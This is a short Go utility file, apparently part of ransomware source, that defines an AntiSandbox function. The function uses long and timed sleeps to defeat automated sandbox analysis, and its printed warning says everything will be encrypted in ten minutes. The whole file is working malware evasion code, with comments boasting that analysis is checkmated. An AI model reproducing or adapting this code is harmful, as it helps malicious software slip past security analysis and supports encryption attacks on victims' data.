package utils

import (
	"fmt"
	"os"
	"time"
)

// Either the sandbox does not skip the sleep, so it will wait too log to be analyzed
// Or the sandbox skips the sleep, so the program exits immediately
// Checkmate!
func AntiSandbox() {
	go func() {
		time.Sleep(3600 * 10 * time.Second)
		os.Exit(0)
	}()
	fmt.Println("Everything Will be encrypted in 10min. Stop worrying and love the bomb...")
	time.Sleep(600 * time.Second)
}
